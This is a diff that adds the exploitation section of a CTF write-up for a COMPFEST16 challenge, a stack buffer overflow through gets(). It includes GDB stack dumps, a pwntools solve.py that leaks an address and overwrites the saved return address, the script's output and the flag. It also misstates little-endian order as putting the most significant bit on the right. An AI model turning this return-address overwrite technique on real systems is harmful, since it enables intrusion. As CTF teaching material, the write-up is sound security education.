@@ -164,17 +164,120 @@ allowing us to overwrite the memory after it.
 That's what's called overflow!
 
 Let's test it out first.
-Let see what our input would be with the input `123456789012345678901234567890123456789012345678901234567890ABCD`:
+Let see what our input would be with the input `123456789012345678901234567890123456789012345678901234567890ABCD` (64 byte):
 
 ```
+0x00007ffe3948f850│+0x0000: "12345678901234567890123456789012345678901234567890[...]"    ← $rax, $rsp
+0x00007ffe3948f858│+0x0008: "90123456789012345678901234567890123456789012345678[...]"
+0x00007ffe3948f860│+0x0010: "78901234567890123456789012345678901234567890ABCD"
+0x00007ffe3948f868│+0x0018: "567890123456789012345678901234567890ABCD"
+0x00007ffe3948f870│+0x0020: "3456789012345678901234567890ABCD"
+0x00007ffe3948f878│+0x0028: "12345678901234567890ABCD"
+0x00007ffe3948f880│+0x0030: "901234567890ABCD"
+0x00007ffe3948f888│+0x0038: "7890ABCD"
+0x00007ffe3948f890│+0x0040: 0x0000000000000000   ← $rbp
+0x00007ffe3948f898│+0x0048: 0x00007f1ffd12dd90  →  <__libc_start_call_main+0080> mov edi, eax
+```
+
+There's the return address!
+We need to extend our input so that we can reach that memory address!
+But to prevent unwanted behaviour,
+our payload should not change the stack as much as it could be.
+Here's how it looks right before `gets` is called:
 
 ```
+0x00007ffdad3f8d30│+0x0000: 0x0000000000000000   ← $rsp, $rdi
+0x00007ffdad3f8d38│+0x0008: 0x0000000000000000
+0x00007ffdad3f8d40│+0x0010: 0x0000000000000000
+0x00007ffdad3f8d48│+0x0018: 0x0000000000000000
+0x00007ffdad3f8d50│+0x0020: 0x0000000000000000
+0x00007ffdad3f8d58│+0x0028: 0x0000000000000000
+0x00007ffdad3f8d60│+0x0030: 0x0000000000000000
+0x00007ffdad3f8d68│+0x0038: 0x0000000100000000
+0x00007ffdad3f8d70│+0x0040: 0x0000000000000001   ← $rbp
+0x00007ffdad3f8d78│+0x0048: 0x00007f1ffd12dd90  →  <__libc_start_call_main+0080> mov edi, eax
+```
+
+Our payload will be something like that,
+to put it bluntly.
+
+Remember, CPU works with little endian,
+where the most significant bit is on the right,
+so the memory address of `0x00007f1ffd12dd90` would become `0x90dd12fd1f7f0000` in our payload.
 
 ### Overwriting Memory
 
-Our payload:
+We'll be using Python pwntools for this.
+Here's our `solve.py`:
+
+```solve.py
+from pwn import *
+
+def recvmenu():
+    for i in range(8):
+        conn.recvline()
+
+conn = remote('challenges.ctf.compfest.id', 20008)
+
+recvmenu()
+
+conn.sendline(b'2')
+conn.recvline()
+conn.recvline()
+conn.recvline()
+conn.recvline()
+# Get the treasure
+harta_karun = conn.recvline()[18:30]
+# Calculate `salty_spitoon` address
+salty_spitoon = str(hex(int(harta_karun, 16) - 171))[2:]
+# Convert to lil endian
+target = b''
+for i in range(0,len(salty_spitoon),2):
+    target += int(salty_spitoon[10-i:12-i], 16).to_bytes(1)
+target += b'\x00\x00'
+print(target)
+
+recvmenu()
+
+conn.sendline(b'1')
+payload = ("\x00"*60+"\x01"+"\x00"*3+"\x01"+"\x00"*7).encode("utf-8") + target
+print(payload)
+conn.sendline(payload)
+conn.recvline()
+
+recvmenu()
+
+conn.sendline(b'3')
+# goooooooooooooooooooooooooooooo
+print(conn.recvline())
+print(conn.recvline())
+print(conn.recvline())
+print(conn.recvline())
+print(conn.recvline())
+print(conn.recvline())
+print(conn.recvline())
+print(conn.recvline())
+print(conn.recvline())
+```
 
 ```
+$ python3 solve.py
+[+] Opening connection to challenges.ctf.compfest.id on port 20008: Done
+b'\x89\xb2\x8f\x1e\x00V\x00\x00'
+b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x89\xb2\x8f\x1e\x00V\x00\x00'
+b'3. Mamah, aku takut. Aku mau ke wingstop ajah \xf0\x9f\x98\xad\xf0\x9f\x98\xad\xf0\x9f\x98\xad\xf0\x9f\x98\xad\n'
+b'> Kamu tidak greget, pergilah! hush hush\n'
+b'Selamat datang di Salty Spitoon, wah ternyata tuan adalah orang paling greget sedunia!\xf0\x9f\x98\xb1\xf0\x9f\x98\xb1\xf0\x9f\x98\xb1\n'
+b'\n'
+b'Dengan datangnya tamu spesial seperti tuan, kami akan menghidangkan menu spesial kami. Mohon tunggu sebentar, tuan!\n'
+b'Terima kasih sudah menunggu. Selamat menikmati menu spesial kami, tuan.\n'
+b'COMPFEST16{emang_boleh_segreget_ini???_maddog_aja_sampe_ketar_ketir_nich_0122111261}\n'
+b'\n'
+b'Terima kasih atas kunjungannya. Mampir lagi ya, tuan!\n'
+[*] Closed connection to challenges.ctf.compfest.id port 20008
 ```
+
+There's the flag!
+We did it!
 
 FLAG: `COMPFEST16{emang_boleh_segreget_ini???_maddog_aja_sampe_ketar_ketir_nich_0122111261}`
